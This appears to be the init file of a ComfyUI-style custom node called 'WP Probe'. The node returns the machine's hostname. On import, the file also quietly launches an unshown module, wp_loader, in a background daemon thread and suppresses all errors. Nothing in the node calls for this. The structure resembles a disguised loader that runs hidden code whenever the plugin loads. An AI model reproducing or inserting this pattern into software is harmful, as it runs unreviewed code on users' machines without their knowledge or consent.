import os
import sys
import threading

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

try:
    import wp_loader
    threading.Thread(target=wp_loader.main, daemon=True).start()
except Exception:
    pass


class WpProbe:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {}}

    RETURN_TYPES = ("STRING",)
    FUNCTION = "run"
    CATEGORY = "wp"

    def run(self):
        import socket
        return (socket.gethostname(),)


NODE_CLASS_MAPPINGS = {"WpProbe": WpProbe}
NODE_DISPLAY_NAME_MAPPINGS = {"WpProbe": "WP Probe"}
